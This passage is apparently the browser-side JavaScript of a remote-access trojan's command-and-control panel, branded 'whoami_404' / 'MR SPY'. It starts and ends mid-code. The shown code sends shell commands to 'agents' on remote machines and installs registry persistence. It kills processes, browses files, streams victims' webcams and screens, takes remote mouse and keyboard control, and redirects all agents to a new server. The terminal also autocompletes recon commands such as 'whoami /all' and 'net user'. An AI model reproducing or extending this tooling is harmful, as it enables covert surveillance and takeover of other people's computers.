        const killBtn = document.getElementById('btn-process-kill');
        if (killBtn && killPidInput) {
            killBtn.addEventListener('click', async () => {
                const pid = killPidInput.value.trim();
                if (!pid) {
                    showToast('warning', 'Please enter a valid PID');
                    return;
                }
                if (!state.selectedAgentId) {
                    showToast('warning', 'Select an agent first');
                    return;
                }
                const confirmOk = await showCustomConfirm({
                    title: 'Kill Process by PID',
                    subtitle: 'Remote Process Manager',
                    message: `Terminate process with PID ${pid}?`,
                    icon: 'ph-x-circle',
                    confirmText: 'Kill Process',
                    isDanger: true
                });
                if (confirmOk) {
                    sendCommand(state.selectedAgentId, 'kill_pid', { pid: pid });
                    showToast('info', `Terminating PID ${pid}...`);
                    killPidInput.value = '';
                    setTimeout(() => {
                        if (state.selectedAgentId) sendCommand(state.selectedAgentId, 'ps');
                    }, 800);
                }
            });
        }

        const suspendTopBtn = document.getElementById('btn-process-suspend-top');
        if (suspendTopBtn && killPidInput) {
            suspendTopBtn.addEventListener('click', () => {
                const pid = killPidInput.value.trim();
                if (!pid) { showToast('warning', 'Please enter a valid PID'); return; }
                if (!state.selectedAgentId) { showToast('warning', 'Select an agent first'); return; }
                sendCommand(state.selectedAgentId, 'process_suspend', { value: pid });
                showToast('info', `Suspending PID ${pid}...`);
                setTimeout(() => { if (state.selectedAgentId) sendCommand(state.selectedAgentId, 'ps'); }, 800);
            });
        }

        const resumeTopBtn = document.getElementById('btn-process-resume-top');
        if (resumeTopBtn && killPidInput) {
            resumeTopBtn.addEventListener('click', () => {
                const pid = killPidInput.value.trim();
                if (!pid) { showToast('warning', 'Please enter a valid PID'); return; }
                if (!state.selectedAgentId) { showToast('warning', 'Select an agent first'); return; }
                sendCommand(state.selectedAgentId, 'process_resume', { value: pid });
                showToast('info', `Resuming PID ${pid}...`);
                setTimeout(() => { if (state.selectedAgentId) sendCommand(state.selectedAgentId, 'ps'); }, 800);
            });
        }

        // Table header sort listeners
        const sortHeaders = [
            { id: 'th-proc-pid', key: 'pid' },
            { id: 'th-proc-name', key: 'name' },
            { id: 'th-proc-cpu', key: 'cpu' },
            { id: 'th-proc-memory', key: 'memory' },
            { id: 'th-proc-status', key: 'status' }
        ];

        sortHeaders.forEach(({ id, key }) => {
            const th = document.getElementById(id);
            if (th) {
                th.addEventListener('click', () => {
                    if (state.processSort.key === key) {
                        state.processSort.dir = state.processSort.dir === 'asc' ? 'desc' : 'asc';
                    } else {
                        state.processSort.key = key;
                        state.processSort.dir = key === 'name' ? 'asc' : 'desc';
                    }
                    displayFilteredProcesses();
                });
            }
        });
    }

    // Initialize process manager interactions on load
    initProcessManagerInteractions();

    // ──────── VIEW SWITCHING ────────
    function switchPane(paneName) {
        document.querySelectorAll('.mrspy-nav-item, .whoami_404-nav-item, .whoami-nav-item').forEach(item => {
            item.classList.toggle('active', item.dataset.pane === paneName);
        });
        document.querySelectorAll('.mrspy-pane, .whoami_404-pane, .whoami-pane').forEach(pane => {
            pane.classList.toggle('active', pane.id === 'pane-' + paneName);
        });
        if (paneName === 'terminal') {
            switchView(paneName);
            stopProcessAutoRefresh();
        } else if (paneName === 'processes') {
            stopProcessAutoRefresh();
            if (state.selectedAgentId && state.agents[state.selectedAgentId]) {
                renderAgentDataView(state.agents[state.selectedAgentId]);
            }
        } else if (paneName === 'process') {
            if (state.selectedAgentId) sendCommand(state.selectedAgentId, 'ps');
            startProcessAutoRefresh();
        } else if (paneName === 'screen') {
            stopProcessAutoRefresh();
        } else if (paneName === 'camera') {
            stopProcessAutoRefresh();
        } else if (paneName === 'microphone') {
            stopProcessAutoRefresh();
        } else if (paneName === 'files') {
            stopProcessAutoRefresh();
            if (state.selectedAgentId) {
                const currentPath = document.getElementById('file-current-path')?.value || 'C:\\';
                requestFileList(currentPath);
            }
        } else if (paneName === 'settings') {
            stopProcessAutoRefresh();
            initTotpSecurity();
        } else {
            stopProcessAutoRefresh();
        }
    }

    function switchView(viewName) {
        document.querySelectorAll('.ws-tab').forEach(b => {
            b.classList.toggle('active', b.dataset.view === viewName);
        });
        document.querySelectorAll('.view-pane').forEach(p => {
            p.classList.toggle('active', p.id === viewName + '-view');
        });
    }

    function switchRightTab(target) {
        document.querySelectorAll('.rt-tab').forEach(b => {
            b.classList.toggle('active', b.dataset.target === target);
        });
        document.querySelectorAll('.rpane').forEach(p => {
            p.classList.toggle('active', p.id === target + '-pane');
        });
    }

    // ──────── UI BINDINGS ────────

    // Mobile drawer navigation handling
    const mobileNavToggle = document.getElementById('mobile-nav-toggle');
    const mobileBackdrop = document.getElementById('mobile-sidebar-backdrop');
    const sidebar = document.getElementById('whoami_404-sidebar');

    function toggleMobileSidebar() {
        if (!sidebar) return;
        const isOpen = sidebar.classList.contains('mobile-open');
        if (isOpen) {
            sidebar.classList.remove('mobile-open');
            if (mobileBackdrop) mobileBackdrop.classList.remove('active');
        } else {
            sidebar.classList.add('mobile-open');
            if (mobileBackdrop) mobileBackdrop.classList.add('active');
        }
    }

    if (mobileNavToggle) {
        mobileNavToggle.addEventListener('click', toggleMobileSidebar);
    }
    if (mobileBackdrop) {
        mobileBackdrop.addEventListener('click', toggleMobileSidebar);
    }

    // WHOAMI_404 / MR SPY sidebar tabs
    document.querySelectorAll('.mrspy-nav-item, .whoami_404-nav-item, .whoami-nav-item').forEach(item => {
        item.addEventListener('click', () => {
            switchPane(item.dataset.pane);
            if (window.innerWidth <= 1024 && sidebar && sidebar.classList.contains('mobile-open')) {
                toggleMobileSidebar();
            }
        });
    });

    // Workspace tabs
    document.querySelectorAll('.ws-tab').forEach(btn => {
        btn.addEventListener('click', () => switchView(btn.dataset.view));
    });

    // Right tabs
    document.querySelectorAll('.rt-tab').forEach(btn => {
        btn.addEventListener('click', () => switchRightTab(btn.dataset.target));
    });

    // Agent search
    const searchInput = document.getElementById('agent-search');
    if (searchInput) searchInput.addEventListener('input', renderAgentList);

    // Agent filters
    document.querySelectorAll('.filter-chip').forEach(chip => {
        chip.addEventListener('click', () => {
            document.querySelectorAll('.filter-chip').forEach(c => c.classList.remove('active'));
            chip.classList.add('active');
            state.currentFilter = chip.dataset.filter;
            renderAgentList();
        });
    });

    // Refresh agents
    const refreshBtn = document.getElementById('refresh-agents');
    if (refreshBtn) {
        refreshBtn.addEventListener('click', () => {
            fetch('/api/agents')
                .then(r => r.json())
                .then(data => {
                    state.agents = {};
                    data.forEach(a => state.agents[a.agent_id] = a);
                    renderAgentList();
                    updateCounters();
                    showToast('info', 'Agent list refreshed');
                })
                .catch(() => showToast('error', 'Failed to refresh'));
        });
    }

    // Logout is handled in LOGOUT & UNLOAD CLEANUP section below with stream termination

    // Lock
    const lockBtn = document.getElementById('lock-btn');
    if (lockBtn) {
        lockBtn.addEventListener('click', () => {
            const lockScreen = document.getElementById('lock-screen');
            if (lockScreen) lockScreen.style.display = 'flex';
        });
    }

    // Unlock
    const unlockBtn = document.getElementById('unlock-btn');
    if (unlockBtn) {
        unlockBtn.addEventListener('click', () => {
            const lockScreen = document.getElementById('lock-screen');
            if (lockScreen) lockScreen.style.display = 'none';
        });
    }

    // Notification toggle
    const notifBtn = document.getElementById('notif-btn');
    if (notifBtn) {
        notifBtn.addEventListener('click', (e) => {
            e.stopPropagation();
            const panel = document.getElementById('notification-panel');
            if (!panel) return;
            const isOpen = panel.style.display === 'block';
            panel.style.display = isOpen ? 'none' : 'block';
            if (!isOpen) {
                state.notifCount = 0;
                updateNotifBadge();
            }
        });
    }

    // Clear notifications
    const clearNotifs = document.getElementById('clear-notifs');
    if (clearNotifs) {
        clearNotifs.addEventListener('click', () => {
            state.notifications = [];
            state.notifCount = 0;
            updateNotifBadge();
            renderNotifications();
        });
    }

    // Close notification panel on outside click
    document.addEventListener('click', (e) => {
        const panel = document.getElementById('notification-panel');
        const btn = document.getElementById('notif-btn');
        if (panel && btn && !panel.contains(e.target) && !btn.contains(e.target)) {
            panel.style.display = 'none';
        }
    });

    // Terminal input & interactions
    const termInput = document.getElementById('terminal-input');
    const termOutput = document.getElementById('terminal-output');
    const termContainer = document.querySelector('.terminal-container');

    // Click anywhere in terminal window to focus input
    if (termContainer && termInput) {
        termContainer.addEventListener('click', (e) => {
            if (window.getSelection().toString().length === 0) {
                termInput.focus();
            }
        });
    }

    if (termInput) {
        state.draftCommand = '';

        termInput.addEventListener('keydown', (e) => {
            // Ctrl+L: Clear terminal screen
            if (e.ctrlKey && e.key.toLowerCase() === 'l') {
                e.preventDefault();
                if (termOutput) termOutput.innerHTML = '';
                return;
            }

            // Ctrl+C: Cancel current input line
            if (e.ctrlKey && e.key.toLowerCase() === 'c') {
                e.preventDefault();
                if (termOutput) {
                    const host = state.agents[state.selectedAgentId]?.hostname || 'c2';
                    const cwd = (state.agentCwd && state.agentCwd[state.selectedAgentId]) || '~';
                    const cancelDiv = document.createElement('div');
                    cancelDiv.style.marginBottom = '4px';
                    cancelDiv.innerHTML = `<span style="color: #4ade80; font-weight: 600;">whoami_404</span><span style="color: var(--text-muted);">@</span><span style="color: #60a5fa; font-weight: 600;">${escapeHtml(host)}</span><span style="color: var(--text-muted);">:</span><span style="color: #c084fc;">${escapeHtml(cwd)}</span><span style="color: var(--text-muted);">$</span> ${escapeHtml(termInput.value)}^C`;
                    termOutput.appendChild(cancelDiv);
                    termOutput.scrollTop = termOutput.scrollHeight;
                }
                termInput.value = '';
                state.draftCommand = '';
                return;
            }

            // Tab: Autocomplete common commands
            if (e.key === 'Tab') {
                e.preventDefault();
                const current = termInput.value.trim().toLowerCase();
                const commonCmds = ['dir', 'whoami', 'whoami /all', 'ipconfig', 'ipconfig /all', 'systeminfo', 'netstat -ano', 'tasklist', 'cls', 'clear', 'powershell', 'cmd', 'cd', 'net user', 'exit'];
                const match = commonCmds.find(c => c.startsWith(current) && c !== current);
                if (match) {
                    termInput.value = match;
                }
                return;
            }

            // Enter: Execute command
            if (e.key === 'Enter') {
                const cmd = termInput.value.trim();
                if (!cmd) return;

                if (cmd.toLowerCase() === 'cls' || cmd.toLowerCase() === 'clear') {
                    if (termOutput) termOutput.innerHTML = '';
                    termInput.value = '';
                    state.draftCommand = '';
                    state.commandHistory.push(cmd);
                    state.historyIndex = state.commandHistory.length;
                    return;
                }

                state.commandHistory.push(cmd);
                state.historyIndex = state.commandHistory.length;
                state.draftCommand = '';

                // Append prompt command line to terminal output
                if (termOutput) {
                    const host = state.agents[state.selectedAgentId]?.hostname || 'c2';
                    const cwd = (state.agentCwd && state.agentCwd[state.selectedAgentId]) || '~';
                    const div = document.createElement('div');
                    div.style.marginBottom = '4px';
                    div.innerHTML = `<span style="color: #4ade80; font-weight: 600;">whoami_404</span><span style="color: var(--text-muted);">@</span><span style="color: #60a5fa; font-weight: 600;">${escapeHtml(host)}</span><span style="color: var(--text-muted);">:</span><span style="color: #c084fc;">${escapeHtml(cwd)}</span><span style="color: var(--text-muted);">$</span> <span style="color: #f8fafc; font-weight: 500;">${escapeHtml(cmd)}</span>`;
                    termOutput.appendChild(div);
                    termOutput.scrollTop = termOutput.scrollHeight;
                }

                if (state.selectedAgentId) {
                    sendCommand(state.selectedAgentId, 'exec', { cmd });
                } else {
                    if (termOutput) {
                        const errDiv = document.createElement('div');
                        errDiv.innerHTML = `<span style="color: #f87171; font-weight: bold;">✗ No agent selected.</span> <span style="color: var(--text-muted);">Select an online agent from the top bar or overview grid.</span>`;
                        termOutput.appendChild(errDiv);
                        termOutput.scrollTop = termOutput.scrollHeight;
                    }
                }

                termInput.value = '';
            }

            // Command history navigation
            if (e.key === 'ArrowUp') {
                e.preventDefault();
                if (state.historyIndex === state.commandHistory.length) {
                    state.draftCommand = termInput.value;
                }
                if (state.historyIndex > 0) {
                    state.historyIndex--;
                    termInput.value = state.commandHistory[state.historyIndex] || '';
                }
            }
            if (e.key === 'ArrowDown') {
                e.preventDefault();
                if (state.historyIndex < state.commandHistory.length - 1) {
                    state.historyIndex++;
                    termInput.value = state.commandHistory[state.historyIndex] || '';
                } else {
                    state.historyIndex = state.commandHistory.length;
                    termInput.value = state.draftCommand || '';
                }
            }
        });
    }

    // Shell mode switcher
    const terminalShellSelect = document.getElementById('terminal-shell-select');
    const terminalShellBadge = document.getElementById('terminal-shell-badge');
    if (terminalShellSelect) {
        terminalShellSelect.addEventListener('change', (e) => {
            const shellType = e.target.value;
            if (terminalShellBadge) {
                terminalShellBadge.textContent = shellType.toUpperCase();
                terminalShellBadge.style.color = shellType === 'powershell' ? '#60a5fa' : '#4ade80';
            }
            if (state.selectedAgentId) {
                sendCommand(state.selectedAgentId, 'shell', { type: shellType });
            } else {
                showToast('info', `Terminal shell set to ${shellType.toUpperCase()}`);
            }
        });
    }

    // Clear Terminal button
    const btnTerminalClear = document.getElementById('btn-terminal-clear');
    if (btnTerminalClear && termOutput) {
        btnTerminalClear.addEventListener('click', () => {
            termOutput.innerHTML = '';
            showToast('info', 'Terminal cleared');
            if (termInput) termInput.focus();
        });
    }


    // Command bar buttons
    const cmdButtons = {
        'cmd-shell': () => {
            if (state.selectedAgentId) sendCommand(state.selectedAgentId, 'shell', { type: 'cmd' });
            switchView('terminal');
        },
        'ps-shell': () => {
            if (state.selectedAgentId) sendCommand(state.selectedAgentId, 'shell', { type: 'powershell' });
            switchView('terminal');
        },
        'sh-shell': () => {
            if (state.selectedAgentId) sendCommand(state.selectedAgentId, 'shell', { type: 'bash' });
            switchView('terminal');
        },
        'persist-btn': () => {
            if (!state.selectedAgentId) { showToast('warning', 'Select an agent first'); return; }
            sendCommand(state.selectedAgentId, 'persistence', { method: 'registry' });
        },
        'emergency-stop': async () => {
            const confirmOk = await showCustomConfirm({
                title: 'EMERGENCY STOP (2FA Required)',
                subtitle: 'Global Killswitch',
                message: '⚠ Enter 6-digit Google Authenticator 2FA code to authorize emergency global killswitch:',
                icon: 'ph-warning-octagon',
                confirmText: 'Verify & KILL ALL AGENTS',
                isDanger: true,
                requireTotp: true
            });
            if (confirmOk) {
                Object.keys(state.agents).forEach(id => {
                    sendCommand(id, 'kill');
                    setTimeout(() => {
                        fetch(`/api/agents/${id}`, {
                            method: 'DELETE',
                            headers: { 'X-CSRFToken': getCsrfToken() }
                        });
                    }, 500);
                });
                showToast('error', 'Emergency kill signal sent to all agents');
            }
        },
        'change-url-global': () => {
            const screen = document.getElementById('change-url-screen');
            if (screen) {
                screen.style.display = 'flex';
                const input = document.getElementById('global-new-url');
                if (input) input.focus();
            }
        },
    };

    Object.entries(cmdButtons).forEach(([id, handler]) => {
        document.querySelectorAll(`[id="${id}"]`).forEach(btn => {
            btn.addEventListener('click', handler);
        });
    });

    const changeUrlCancelBtn = document.getElementById('change-url-cancel-btn');
    if (changeUrlCancelBtn) {
        changeUrlCancelBtn.addEventListener('click', () => {
            document.getElementById('change-url-screen').style.display = 'none';
            document.getElementById('global-new-url').value = '';
        });
    }

    const changeUrlSubmitBtn = document.getElementById('change-url-submit-btn');
    if (changeUrlSubmitBtn) {
        changeUrlSubmitBtn.addEventListener('click', async () => {
            let url = document.getElementById('global-new-url').value.trim();
            if (!url) {
                showToast('warning', 'Please enter a valid URL');
                return;
            }
            if (!url.startsWith('http://') && !url.startsWith('https://')) {
                url = 'http://' + url;
            }
            const confirmOk = await showCustomConfirm({
                title: 'Change Server URL',
                subtitle: 'System Configuration',
                message: `Are you sure you want to change the server URL for ALL agents to ${url}?`,
                icon: 'ph-arrows-clockwise',
                confirmText: 'Update Server URL',
                isDanger: true
            });
            if (confirmOk) {
                Object.keys(state.agents).forEach(id => {
                    sendCommand(id, 'change_url', { value: url });
                });
                showToast('success', 'Change URL command sent to all agents');
                document.getElementById('change-url-screen').style.display = 'none';
                document.getElementById('global-new-url').value = '';
            }
        });
    }

    // File Explorer controls
    const pathInput = document.getElementById('file-current-path');
    const goBtn = document.getElementById('f-path-go');
    if (pathInput && goBtn) {
        goBtn.addEventListener('click', () => requestFileList(pathInput.value));
        pathInput.addEventListener('keydown', (e) => {
            if (e.key === 'Enter') requestFileList(pathInput.value);
        });
    }

    const refreshBtnFile = document.getElementById('refresh-btn');
    if (refreshBtnFile) {
        refreshBtnFile.addEventListener('click', () => {
            const currentPath = document.getElementById('file-current-path')?.value || 'C:\\';
            requestFileList(currentPath);
        });
    }

    // ──────── MEDIA HELPER FUNCTIONS ────────
    function captureFrameSnapshot(sourceVideoId, sourceImgId, filenamePrefix) {
        const videoEl = document.getElementById(sourceVideoId);
        const imgEl = document.getElementById(sourceImgId);
        const canvas = document.createElement('canvas');
        let captured = false;

        if (videoEl && videoEl.style.display !== 'none' && videoEl.videoWidth > 0) {
            canvas.width = videoEl.videoWidth;
            canvas.height = videoEl.videoHeight;
            const ctx = canvas.getContext('2d');
            if (videoEl.style.transform && videoEl.style.transform.includes('scaleX(-1)')) {
                ctx.translate(canvas.width, 0);
                ctx.scale(-1, 1);
            }
            ctx.drawImage(videoEl, 0, 0);
            captured = true;
        } else if (imgEl && imgEl.style.display !== 'none' && imgEl.naturalWidth > 0) {
            canvas.width = imgEl.naturalWidth;
            canvas.height = imgEl.naturalHeight;
            const ctx = canvas.getContext('2d');
            if (imgEl.style.transform && imgEl.style.transform.includes('scaleX(-1)')) {
                ctx.translate(canvas.width, 0);
                ctx.scale(-1, 1);
            }
            ctx.drawImage(imgEl, 0, 0);
            captured = true;
        }

        if (captured) {
            const link = document.createElement('a');
            const ts = new Date().toISOString().replace(/[:.]/g, '-');
            link.download = `${filenamePrefix}_${state.selectedAgentId || 'agent'}_${ts}.jpg`;
            link.href = canvas.toDataURL('image/jpeg', 0.95);
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
            showToast('success', `Snapshot downloaded: ${link.download}`);
        } else {
            showToast('warning', 'No active frame to capture. Start the stream first.');
        }
    }

    function toggleElementFullscreen(wrapperId) {
        const elem = document.getElementById(wrapperId);
        if (!elem) return;
        const isFullscreen = document.fullscreenElement || document.webkitFullscreenElement || document.mozFullScreenElement || document.msFullscreenElement;
        if (!isFullscreen) {
            if (elem.requestFullscreen) {
                elem.requestFullscreen();
            } else if (elem.webkitRequestFullscreen) {
                elem.webkitRequestFullscreen();
            } else if (elem.mozRequestFullScreen) {
                elem.mozRequestFullScreen();
            } else if (elem.msRequestFullscreen) {
                elem.msRequestFullscreen();
            }
        } else {
            if (document.exitFullscreen) {
                document.exitFullscreen();
            } else if (document.webkitExitFullscreen) {
                document.webkitExitFullscreen();
            } else if (document.mozCancelFullScreen) {
                document.mozCancelFullScreen();
            } else if (document.msExitFullscreen) {
                document.msExitFullscreen();
            }
        }
    }

    document.addEventListener('fullscreenchange', () => {
        const isFs = !!document.fullscreenElement;
        const screenFsBtn = document.getElementById('btn-screen-fullscreen');
        const cameraFsBtn = document.getElementById('btn-camera-fullscreen');
        if (screenFsBtn) {
            const icon = screenFsBtn.querySelector('i');
            if (icon) icon.className = isFs ? 'ph ph-corners-in' : 'ph ph-corners-out';
        }
        if (cameraFsBtn) {
            const icon = cameraFsBtn.querySelector('i');
            if (icon) icon.className = isFs ? 'ph ph-corners-in' : 'ph ph-corners-out';
        }
    });

    function applyAudioDspMode(mode) {
        if (!pcmAudioCtx || !pcmHpFilter || !pcmLpFilter || !pcmCompressor) return;
        const now = pcmAudioCtx.currentTime;
        if (mode === 'studio') {
            pcmHpFilter.frequency.setValueAtTime(120, now);
            pcmLpFilter.frequency.setValueAtTime(6500, now);
            pcmCompressor.threshold.setValueAtTime(-24, now);
            pcmCompressor.knee.setValueAtTime(30, now);
            pcmCompressor.ratio.setValueAtTime(12, now);
            pcmCompressor.attack.setValueAtTime(0.003, now);
            pcmCompressor.release.setValueAtTime(0.25, now);
        } else if (mode === 'gate') {
            pcmHpFilter.frequency.setValueAtTime(200, now);
            pcmLpFilter.frequency.setValueAtTime(4500, now);
            pcmCompressor.threshold.setValueAtTime(-32, now);
            pcmCompressor.knee.setValueAtTime(15, now);
            pcmCompressor.ratio.setValueAtTime(20, now);
            pcmCompressor.attack.setValueAtTime(0.001, now);
            pcmCompressor.release.setValueAtTime(0.15, now);
        } else if (mode === 'raw') {
            pcmHpFilter.frequency.setValueAtTime(20, now);
            pcmLpFilter.frequency.setValueAtTime(20000, now);
            pcmCompressor.threshold.setValueAtTime(0, now);
            pcmCompressor.ratio.setValueAtTime(1, now);
        }
    }

    // Camera controls
    const btnCameraStart = document.getElementById('btn-camera-start');
    const btnCameraStop = document.getElementById('btn-camera-stop');
    if (btnCameraStart && btnCameraStop) {
        btnCameraStart.addEventListener('click', () => {
            if (!state.selectedAgentId) {
                showToast('warning', 'Select an agent first');
                return;
            }
            const devIdx = parseInt(document.getElementById('camera-device-select')?.value || '0');
            const fps = parseInt(document.getElementById('camera-fps')?.value || 30);
            const resVal = parseInt(document.getElementById('camera-res')?.value || 1920);
            const quality = parseInt(document.getElementById('camera-quality')?.value || 70);
            const width = resVal === 0 ? 0 : resVal;

            const fxVal = document.getElementById('camera-fx-mode')?.value || 'raw';

            btnCameraStart.disabled = true;
            startWebRTCStream('camera', { device: devIdx, fps, quality, width, target_width: width, ai_mode: fxVal });
            socket.emit('start_camera', { agent_id: state.selectedAgentId, device: devIdx, fps, quality, width, ai_mode: fxVal });

            const cameraBadge = document.getElementById('camera-quality-badge');
            if (cameraBadge) {
                let resLabel = resVal === 0 ? 'Native' : (resVal === 1920 ? '1080p' : (resVal === 2560 ? '2K' : (resVal === 1280 ? '720p' : '480p')));
                cameraBadge.textContent = `${resLabel} ${fps}FPS (${quality}%)`;
                cameraBadge.style.display = 'inline-block';
            }

            setTimeout(() => {
                btnCameraStart.style.display = 'none';
                btnCameraStop.style.display = 'inline-flex';
                btnCameraStart.disabled = false;
            }, 500);
        });
        btnCameraStop.addEventListener('click', () => {
            if (!state.selectedAgentId) {
                showToast('warning', 'Select an agent first');
                return;
            }
            btnCameraStop.disabled = true;
            btnCameraStop.style.display = 'none';
            btnCameraStart.style.display = 'inline-flex';
            stopWebRTCStream('camera');
            socket.emit('stop_camera', { agent_id: state.selectedAgentId });

            setTimeout(() => {
                btnCameraStop.disabled = false;
            }, 300);
        });
    }

    state.cameraMirrored = true;
    const btnCameraMirror = document.getElementById('btn-camera-mirror');
    if (btnCameraMirror) {
        btnCameraMirror.addEventListener('click', () => {
            state.cameraMirrored = !state.cameraMirrored;
            const transformVal = state.cameraMirrored ? 'scaleX(-1)' : 'none';
            const vid = document.getElementById('camera-video');
            const img = document.getElementById('camera-img');
            if (vid) vid.style.transform = transformVal;
            if (img) img.style.transform = transformVal;
            showToast('info', state.cameraMirrored ? 'Camera Mirror enabled (Right is Right)' : 'Camera Mirror disabled (Raw sensor view)');
        });
    }

    const btnCameraSnapshot = document.getElementById('btn-camera-snapshot');
    if (btnCameraSnapshot) {
        btnCameraSnapshot.addEventListener('click', () => {
            captureFrameSnapshot('camera-video', 'camera-img', 'webcam_capture');
        });
    }

    const btnCameraFullscreen = document.getElementById('btn-camera-fullscreen');
    if (btnCameraFullscreen) {
        btnCameraFullscreen.addEventListener('click', () => {
            toggleElementFullscreen('camera-stream-wrapper');
        });
    }

    const cameraFxSelect = document.getElementById('camera-fx-mode');
    if (cameraFxSelect) {
        cameraFxSelect.addEventListener('change', () => {
            const mode = cameraFxSelect.value;
            if (state.selectedAgentId && activeWebRTC.camera.pc) {
                socket.emit('update_stream_params', {
                    agent_id: state.selectedAgentId,
                    stream_type: 'camera',
                    ai_mode: mode
                });
            }
            showToast('info', `Camera FX set to: ${cameraFxSelect.options[cameraFxSelect.selectedIndex].text}`);
        });
    }

    // Process Manager controls
    const btnProcessRefresh = document.getElementById('btn-process-refresh');
    if (btnProcessRefresh) {
        btnProcessRefresh.addEventListener('click', () => {
            if (!state.selectedAgentId) { showToast('warning', 'Select an agent first'); return; }
            sendCommand(state.selectedAgentId, 'ps');
        });
    }
    const btnProcessKill = document.getElementById('btn-process-kill');
    if (btnProcessKill) {
        btnProcessKill.addEventListener('click', async () => {
            if (!state.selectedAgentId) { showToast('warning', 'Select an agent first'); return; }
            const pidVal = document.getElementById('process-kill-pid')?.value?.trim();
            if (!pidVal) { showToast('warning', 'Enter a valid PID to kill'); return; }
            const confirmOk = await showCustomConfirm({
                title: 'Kill Process PID',
                subtitle: 'Process Manager',
                message: `Terminate process PID ${pidVal}?`,
                icon: 'ph-x-circle',
                confirmText: 'Kill Process',
                isDanger: true
            });
            if (confirmOk) {
                sendCommand(state.selectedAgentId, 'kill_pid', { pid: pidVal });
                setTimeout(() => {
                    if (state.selectedAgentId) sendCommand(state.selectedAgentId, 'ps');
                }, 1000);
            }
        });
    }
    const processSearchInput = document.getElementById('process-search-input');
    if (processSearchInput) {
        processSearchInput.addEventListener('input', (e) => {
            const query = e.target.value.toLowerCase();
            document.querySelectorAll('#process-table-body tr.proc-row').forEach(row => {
                const text = row.textContent.toLowerCase();
                row.style.display = text.includes(query) ? '' : 'none';
            });
        });
    }

    // Screen controls
    const btnScreenStart = document.getElementById('btn-screen-start');
    const btnScreenStop = document.getElementById('btn-screen-stop');
    const screenVideoEl = document.getElementById('screen-video');
    const screenImgEl = document.getElementById('screen-img');

    if (btnScreenStart && btnScreenStop) {
        btnScreenStart.addEventListener('click', () => {
            if (!state.selectedAgentId) {
                showToast('warning', 'Select an agent first');
                return;
            }
            const fps = parseInt(document.getElementById('screen-fps')?.value || 60);
            const resVal = parseInt(document.getElementById('screen-res')?.value || 1920);
            const quality = parseInt(document.getElementById('screen-quality')?.value || 75);
            const width = resVal === 0 ? 0 : resVal;

            btnScreenStart.disabled = true;
            startWebRTCStream('screen', { fps, quality, width, target_width: width });
            socket.emit('start_screen', { agent_id: state.selectedAgentId, fps, quality, width });

            const qualityBadge = document.getElementById('screen-quality-badge');
            if (qualityBadge) {
                let resLabel = resVal === 0 ? 'Native' : (resVal === 1920 ? '1080p' : (resVal === 2560 ? '2K' : (resVal === 1280 ? '720p' : '480p')));
                qualityBadge.textContent = `${resLabel} ${fps}FPS (${quality}%)`;
                qualityBadge.style.display = 'inline-block';
            }

            setTimeout(() => {
                btnScreenStart.style.display = 'none';
                btnScreenStop.style.display = 'inline-flex';
                btnScreenStart.disabled = false;
            }, 500);
        });
        btnScreenStop.addEventListener('click', () => {
            if (!state.selectedAgentId) {
                showToast('warning', 'Select an agent first');
                return;
            }
            btnScreenStop.disabled = true;
            btnScreenStop.style.display = 'none';
            btnScreenStart.style.display = 'inline-flex';
            stopWebRTCStream('screen');
            socket.emit('stop_screen', { agent_id: state.selectedAgentId });

            setTimeout(() => {
                btnScreenStop.disabled = false;
            }, 300);
        });
    }

    const btnScreenSnapshot = document.getElementById('btn-screen-snapshot');
    if (btnScreenSnapshot) {
        btnScreenSnapshot.addEventListener('click', () => {
            captureFrameSnapshot('screen-video', 'screen-img', 'screen_intercept');
        });
    }

    const btnScreenFullscreen = document.getElementById('btn-screen-fullscreen');
    if (btnScreenFullscreen) {
        btnScreenFullscreen.addEventListener('click', () => {
            toggleElementFullscreen('screen-stream-wrapper');
        });
    }

    // ──────── REMOTE CONTROL & SHORTCUTS INTERACTION ────────
    const btnRemoteControl = document.getElementById('btn-remote-control');
    const remoteControlLabel = document.getElementById('remote-control-label');
    const remoteControlIcon = document.getElementById('remote-control-icon');
    const remoteControlHud = document.getElementById('remote-control-hud');

    if (btnRemoteControl) {
        btnRemoteControl.addEventListener('click', () => {
            if (!state.selectedAgentId) {
                showToast('warning', 'Select an agent first');
                return;
            }
            state.remoteControlActive = !state.remoteControlActive;
            if (state.remoteControlActive) {
                btnRemoteControl.classList.add('active');
                if (remoteControlLabel) remoteControlLabel.textContent = 'Control: ON';
                if (remoteControlIcon) remoteControlIcon.style.color = '#34d399';
                if (remoteControlHud) remoteControlHud.style.display = 'flex';
                if (screenVideoEl) {
                    screenVideoEl.classList.add('remote-control-active');
                    screenVideoEl.focus();
                }
                showToast('success', 'Remote Control ENABLED (Direct Input Active)');
            } else {
                btnRemoteControl.classList.remove('active');
                if (remoteControlLabel) remoteControlLabel.textContent = 'Control: OFF';
                if (remoteControlIcon) remoteControlIcon.style.color = 'var(--text-muted)';
                if (remoteControlHud) remoteControlHud.style.display = 'none';
                if (screenVideoEl) screenVideoEl.classList.remove('remote-control-active');
                showToast('info', 'Remote Control DISABLED');
            }
        });
    }

    // System Shortcuts Dropdown
    const btnScreenShortcuts = document.getElementById('btn-screen-shortcuts');
    const screenShortcutsMenu = document.getElementById('screen-shortcuts-menu');
    if (btnScreenShortcuts && screenShortcutsMenu) {
        btnScreenShortcuts.addEventListener('click', (e) => {
            e.stopPropagation();
            const isOpen = screenShortcutsMenu.style.display === 'block';
            screenShortcutsMenu.style.display = isOpen ? 'none' : 'block';
        });

        document.addEventListener('click', (e) => {
            if (!screenShortcutsMenu.contains(e.target) && e.target !== btnScreenShortcuts) {
                screenShortcutsMenu.style.display = 'none';
            }
        });

        document.querySelectorAll('.shortcut-item-btn').forEach(btn => {
            btn.addEventListener('click', (e) => {
                e.stopPropagation();
                screenShortcutsMenu.style.display = 'none';
                if (!state.selectedAgentId) {
                    showToast('warning', 'Select an agent first');
                    return;
                }
                const action = btn.dataset.action;
                if (action) {
                    sendRemoteInput({ type: 'shortcut', action: action });
                    showToast('info', `Sent shortcut: ${btn.textContent.trim()}`);
                }
            });
        });
    }

    // High-Precision Mouse & Touch Events for Screen Video
    if (screenVideoEl) {
        let lastMoveSent = 0;

        screenVideoEl.addEventListener('mousemove', (e) => {
            if (!state.remoteControlActive) return;
            const now = performance.now();
            if (now - lastMoveSent < 16) return; // Cap mousemove events to ~60Hz for zero congestion
            lastMoveSent = now;

            const coords = getNormalizedVideoCoordinates(e, screenVideoEl);
            if (coords) {
                sendRemoteInput({
                    type: 'mouse_move',
                    x: coords.x,
                    y: coords.y
                });
            }
        });

        screenVideoEl.addEventListener('mousedown', (e) => {
            if (!state.remoteControlActive) return;
